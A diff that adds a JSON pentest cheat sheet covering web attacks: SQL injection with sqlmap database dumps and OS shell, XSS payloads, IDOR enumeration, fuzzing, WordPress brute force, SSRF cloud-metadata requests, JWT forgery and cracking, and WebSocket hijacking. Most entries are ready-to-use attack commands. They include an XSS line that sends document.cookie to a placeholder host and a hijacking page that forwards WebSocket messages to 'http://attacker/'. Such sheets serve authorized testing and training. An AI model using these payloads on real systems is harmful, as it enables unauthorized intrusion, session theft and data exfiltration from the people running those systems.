@@ -1,0 +1,118 @@
+{
+  "sql_injection": {
+    "title": "SQL Injection",
+    "category": "Web Application",
+    "desc": "Test and exploit SQL injection vulnerabilities.",
+    "steps": [
+      ["Manual auth bypass test", "' OR 1=1--"],
+      ["Automate with sqlmap", "sqlmap -u 'http://<IP>/page?id=1' --batch"],
+      ["List databases", "sqlmap -u '<URL>' --dbs"],
+      ["List tables in database", "sqlmap -u '<URL>' -D <DB> --tables"],
+      ["Dump table contents", "sqlmap -u '<URL>' -D <DB> -T <TABLE> --dump"],
+      ["Spawn OS shell", "sqlmap -u '<URL>' --os-shell"]
+    ]
+  },
+  "xss": {
+    "title": "Cross-Site Scripting (XSS)",
+    "category": "Web Application",
+    "desc": "Test for reflected, stored, and DOM-based XSS.",
+    "steps": [
+      ["Basic script alert", "<script>alert(1)</script>"],
+      ["Image error handler payload", "<img src=x onerror=alert(1)>"],
+      ["Session cookie exfiltration", "<script>fetch('http://<IP>/?c='+document.cookie)</script>"],
+      ["Burp intercept workflow", "Intercept request -> Modify parameter -> Forward"],
+      ["DOM-based XSS fragment", "#<img src=x onerror=alert(1)>"]
+    ]
+  },
+  "idor": {
+    "title": "Insecure Direct Object Reference (IDOR)",
+    "category": "Web Application",
+    "desc": "Access unauthorized user records by modifying IDs.",
+    "steps": [
+      ["Inspect parameter", "Example: /profile?id=5"],
+      ["Iterate identifiers", "Test /profile?id=1 or /profile?id=2"],
+      ["Burp Intruder fuzzing", "Send to Intruder -> Sniper -> Numbers 1-100"],
+      ["Audit API routes", "/api/user/1, /api/user/2, ..."]
+    ]
+  },
+  "ffuf": {
+    "title": "FFUF - Fast Web Fuzzer",
+    "category": "Web Application",
+    "desc": "Fast web fuzzer for endpoints, vhosts, and parameters.",
+    "steps": [
+      ["Directory discovery", "ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"],
+      ["Parameter fuzzing", "ffuf -u 'http://<IP>/page.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"],
+      ["Virtual host discovery", "ffuf -u http://<IP> -H 'Host: FUZZ.<IP>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 4242"]
+    ]
+  },
+  "burp_suite": {
+    "title": "Burp Suite",
+    "category": "Web Application",
+    "desc": "Industry standard web application security suite.",
+    "steps": [
+      ["Start Burp Suite", "burpsuite"],
+      ["Configure proxy listener", "Set browser proxy to 127.0.0.1:8080"],
+      ["Intercept request", "Proxy -> Intercept is on"],
+      ["Send to Repeater", "Right-click request -> Send to Repeater"],
+      ["Send to Intruder", "Right-click request -> Send to Intruder"]
+    ]
+  },
+  "nikto": {
+    "title": "Nikto - Web Server Scanner",
+    "category": "Web Application",
+    "desc": "Scan web servers for dangerous files and outdated software.",
+    "steps": [
+      ["Basic HTTP scan", "nikto -h http://<IP>"],
+      ["Scan over HTTPS", "nikto -h https://<IP> -ssl"],
+      ["Scan custom port", "nikto -h http://<IP>:8080"]
+    ]
+  },
+  "wpscan": {
+    "title": "WPScan - WordPress Vulnerability Scanner",
+    "category": "Web Application",
+    "desc": "Blackbox WordPress vulnerability scanner.",
+    "steps": [
+      ["Scan WordPress URL", "wpscan --url http://<IP>"],
+      ["Enumerate valid users", "wpscan --url http://<IP> -e u"],
+      ["Enumerate plugins", "wpscan --url http://<IP> -e ap --plugins-detection aggressive"],
+      ["Brute-force login", "wpscan --url http://<IP> -U users.txt -P rockyou.txt"]
+    ]
+  },
+  "ssrf": {
+    "title": "Server-Side Request Forgery (SSRF)",
+    "category": "Web Application",
+    "desc": "Exploit SSRF to reach internal services or cloud metadata APIs.",
+    "steps": [
+      ["AWS metadata endpoint", "curl -s 'http://169.254.169.254/latest/meta-data/'"],
+      ["GCP metadata endpoint", "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/'"],
+      ["Azure metadata endpoint", "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"],
+      ["Internal port scan via SSRF", "http://<IP>/fetch?url=http://127.0.0.1:<PORT>/"],
+      ["DNS rebinding bypass", "Set parameter to evil.com that resolves to an internal IP"]
+    ]
+  },
+  "jwt_attacks": {
+    "title": "JWT Attacks",
+    "category": "Web Application",
+    "desc": "Attack weakly implemented JSON Web Token authentication.",
+    "steps": [
+      ["Decode JWT payload", "echo '<base64_payload>' | base64 -d | python3 -m json.tool"],
+      ["None algorithm bypass", "Set alg to 'none' and strip the signature section"],
+      ["Crack weak secret with Hashcat", "hashcat -a 0 -m 16500 token.txt wordlist.txt"],
+      ["Crack with jwt_tool", "python3 jwt_tool.py <TOKEN> -C -d wordlist.txt"],
+      ["RS256 to HS256 confusion attack", "python3 jwt_tool.py <TOKEN> -X k -pk public.pem"],
+      ["Tamper claims interactively", "python3 jwt_tool.py <TOKEN> -T"]
+    ]
+  },
+  "websocket_hijacking": {
+    "title": "WebSocket Hijacking (CSWSH)",
+    "category": "Web Application",
+    "desc": "Cross-Site WebSocket Hijacking and WS message interception.",
+    "steps": [
+      ["Detect WebSocket upgrade", "Burp Suite -> Proxy -> WebSockets history"],
+      ["Intercept WS messages", "Burp Suite -> Proxy -> WebSockets history -> edit message"],
+      ["CSWSH exploit page", "<script>var ws=new WebSocket('wss://<IP>/chat'); ws.onmessage=function(e){fetch('http://attacker/?d='+e.data)}</script>"],
+      ["Replay WS message in Burp", "Right-click WebSocket message -> Send to Repeater"],
+      ["Fuzz WebSocket with wscat", "wscat -c ws://<IP>/chat"]
+    ]
+  }
+}
